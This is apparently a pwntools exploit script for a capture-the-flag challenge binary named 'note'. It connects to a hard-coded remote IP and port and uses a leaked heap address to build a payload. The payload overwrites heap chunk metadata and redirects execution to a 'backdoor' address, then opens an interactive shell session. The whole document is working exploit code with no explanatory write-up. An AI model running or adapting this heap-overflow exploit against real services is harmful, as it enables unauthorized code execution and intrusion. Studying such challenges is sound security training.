#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'note'
remote_addr, port = '47.95.3.252:36884'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda x:log.success(x)
slp = lambda x:sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def add():
    ru('>>')
    sl('1')
    rl()

def edit(idx,size,content):
    ru('>>')
    sl('3')
    ru('index: ')
    sl(str(idx))
    ru('len: ')
    sl(str(size))
    ru('content: ')
    sl(content)

def show(idx):
    ru('>>')
    sl('2')
    ru('index:')
    sl(str(idx))
    ru('gift: ')
    gift = int(rl().strip(),16)
    rl()
    rl()
    return gift

#def edit(idx,size,content):
#Main function
if __name__ == '__main__':
    #you can add your code here
    backdoor = 0x080489CE
    add()
    add()
    gift = show(1) - 0x10
    display(hex(gift))
    payload = b'a'*8 + p32(backdoor) + p32(0) + p32(0) + p32(0x00000021) + p32(gift)
    edit(0,0x1c,payload)
    edit(1,0x2,'a')
    p.interactive()